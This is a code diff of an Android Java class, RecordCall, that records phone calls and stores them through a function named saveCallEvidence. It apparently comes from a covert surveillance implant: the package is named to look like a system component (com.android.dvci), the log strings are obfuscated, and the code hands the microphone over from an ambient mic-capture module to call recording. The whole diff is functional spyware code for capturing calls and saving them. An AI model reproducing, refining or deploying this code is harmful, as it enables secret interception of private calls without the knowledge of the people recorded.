@@ -1,22 +1,16 @@
 package com.android.dvci.module.call;
 
-import java.io.IOException;
 import java.util.Date;
-import java.util.concurrent.TimeUnit;
 
 import android.media.MediaRecorder;
 
 import com.android.dvci.Call;
-import com.android.dvci.Device;
-import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Path;
 import com.android.dvci.module.ModuleCall;
 import com.android.dvci.module.ModuleMic;
 import com.android.dvci.util.Check;
-import com.android.dvci.util.DateTime;
-import com.android.dvci.util.Execute;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
 import android.media.MediaRecorder.OnErrorListener;
@@ -34,8 +28,7 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 	private Call call;
 	private boolean incoming;
 	private boolean recorder_started=false;
-
-
+	private int try_source=0;
 	private int numFailures=0;
 
 	public synchronized static RecordCall self() {
@@ -70,13 +63,11 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 
 
 	private boolean startRecord() {
-		boolean firstTime = false;
 		if (Cfg.DEBUG) {
 			Check.log(TAG + M.e(" startRecord"));
 		}
 		if (recorder == null) {
 			recorder = new MediaRecorder();
-			firstTime = true;
 		}else {
 			if (recorder_started) {
 				if (Cfg.DEBUG) {
@@ -110,6 +101,7 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 					Check.log(e);
 				}
 			}
+			numFailures++;
 			return false;
 		}
 		if (Cfg.DEBUG) {
@@ -152,7 +144,7 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 				numFailures += 1;
 			} else {
 				//String myNumber = Device.self().getPhoneNumber();
-				ModuleCall.saveCallEvidence(call.getFrom(), call.getTo(), incoming, call.getTimeBegin(), call.isComplete()?call.getTimeEnd():new Date(),
+				ModuleCall.saveCallEvidence(call.getFrom(), call.getTo(), incoming, call.getTimeBegin(), call.isComplete() ? call.getTimeEnd() : new Date(),
 						onGoing_chunk.getFilename(), call.isComplete(), 1, CALL_PHONE);
 				//deleteFile();
 				//saveRecorderEvidence();
@@ -166,7 +158,7 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 	public boolean isSupported() {
 		return true;
 	}
-	public boolean stopCall(){
+	public boolean stopCall() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (stopCall) called");
 		}
@@ -175,34 +167,33 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 			if (recorder != null) {
 				recorder.release();
 			}
-			if (ModuleCall.isMicAvailable()) {
-				ModuleMic.self().resetBlacklist();
-			}
-		}catch (Exception e){
+		} catch (Exception e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + M.e(" (stopCall) failure to stop"));
 				if (Cfg.EXCEPTION) {
 					Check.log(e);
 				}
 			}
-		}finally {
-
+		} finally {
 			recorder = null;
 			call = null;
 
 		}
 		return true;
 	}
+	public boolean isMicAvailable(){
+		return ModuleMic.self() != null && !ModuleCall.self().isSuspended() ;
+	}
 
-	public boolean recordCall( final Call call, final boolean incoming) {
+	public boolean recordCall( final Call call) {
+		/* module call shall be running before start to record a call */
 		if(numFailures>MAX_NUM_OF_FAILURE){
 			//module.recordFlag = false;
 			return false;
 		}
-
 		if (this.recorder == null) {
 			this.call = call;
-			this.incoming = incoming;
+			this.incoming = call.isIncoming();
 			/*
 			if (stopRecord()) {
 				Object future = Status.getStpe().schedule(new Runnable() {
@@ -218,20 +209,20 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 			}
 			return true;
 			*/
-			if (ModuleCall.isMicAvailable()) {
+			if (ModuleCall.self().isMicAvailable()) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (recordCall) can't register call because mic is on:stopping it");
 				}
-				ModuleMic.self().stop();
+				ModuleMic.self().stop(this);
 			}
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): start call recording procedure..."); //$NON-NLS-1$
+				Check.log(TAG + " (recordCall): start call recording procedure..."); //$NON-NLS-1$
 			}
 		}
 		if (startRecord() == true) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): recording started on file: " + onGoing_chunk.getName()); //$NON-NLS-1$
+				Check.log(TAG + " (recordCall): recording started on file: " + onGoing_chunk.getName()); //$NON-NLS-1$
 			}
 
 		}
